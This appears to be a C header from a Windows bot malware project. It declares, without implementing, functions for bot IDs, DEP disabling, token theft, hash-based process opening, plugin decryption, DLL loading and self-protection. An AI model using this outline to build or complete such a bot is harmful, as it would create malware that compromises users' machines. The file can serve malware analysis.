#include <windows.h>

#define WIN_2000	1
#define WIN_XP		2
#define WIN_2003	3
#define WIN_VISTA	4
#define WIN_7		5

DWORD CalcHash( char *Str );
DWORD CalcHashW( PWSTR str );
DWORD Crypt( char* lpPassword, LPBYTE lpResult, DWORD dwSize );
DWORD GetProcessIdByHash( DWORD dwHash );
char *GetProcessList();

HANDLE WINAPI StartThread( LPVOID lpStartAddress, LPVOID param );
HANDLE OpenProcessEx( DWORD dwHash );
void GetUserToken();



char * FileToMD5(char *URL);
void GenerateUid( char *BotUid );
char *GetOSInfo();
LPVOID GetInfoTable( DWORD dwTableType );
void GetOSVersion();
bool RunFile( WCHAR *Path );
bool RunFileEx( WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread );

HANDLE CreateUpdateMutex();
DWORD GetCurrentSessionId();

DWORD WINAPI LoadDll( LPVOID lpData );
DWORD GetFileHash( WCHAR *File );
bool GodmodeOnFile( WCHAR *Filename );


void DisableDEP();
DWORD GetProcessHash();

void ProtectBot();
void UnProtectBot();

LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize );
LPVOID DecryptPlugin( LPBYTE Pointer, DWORD dwLen );

// Функция возвращает идентификатор процесса эксплорера (Explorer.exe)
DWORD GetExplorerPid();

#define min(a,b)            (((a) < (b)) ? (a) : (b))